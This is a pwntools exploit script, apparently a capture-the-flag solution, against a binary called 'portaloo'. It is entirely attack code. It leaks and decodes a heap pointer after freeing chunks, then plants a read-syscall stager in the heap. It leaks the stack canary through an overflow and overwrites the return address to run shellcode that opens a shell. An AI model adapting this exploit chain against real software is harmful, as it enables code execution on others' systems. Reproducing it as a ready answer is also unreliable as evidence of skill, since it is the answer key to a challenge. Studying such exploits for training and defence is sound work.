#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './portaloo')
libc = ELF(exe.libc.path)

def create(idx):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())

def destroy(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())

def upgrade(idx, data):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b"data: ", data)

def leak():
    io.sendlineafter(b"> ", b"4")
    io.recvuntil(b"Coordinate: ")
    enc_addr = u64(io.recvline().strip().split(b" ---- Data: ")[1].ljust(8, b'\x00'))
    io.recvuntil(b"Coordinate: ")
    key = u64(io.recvline().strip().split(b" ---- Data: ")[1].ljust(8, b'\x00'))
    return (enc_addr^key)-0x30, enc_addr^key

io = process('./portaloo')

create(0)
create(1)

destroy(1)
destroy(0)

chunk_0, chunk_1 = leak()

stager = asm('''
    pop rsi
    mov rdx, 64
    xor rax, rax
    xor rdi, rdi
    syscall
    jmp rsi
''')
upgrade(0, stager)

io.sendlineafter(b"> ", b"5")
io.sendlineafter(b"> ", b"A"*0x48)
io.recvuntil(b"choosing ")
io.recvline()
canary = u64(io.recvline().strip()[0:7].rjust(8, b"\x00"))

io.sendafter(b": ", b"A"*72 + p64(canary) + p64(0x00) + p64(chunk_0) + p64(chunk_0-80))
io.send(b"\x90" * 16 + asm(shellcraft.sh()))

io.interactive()

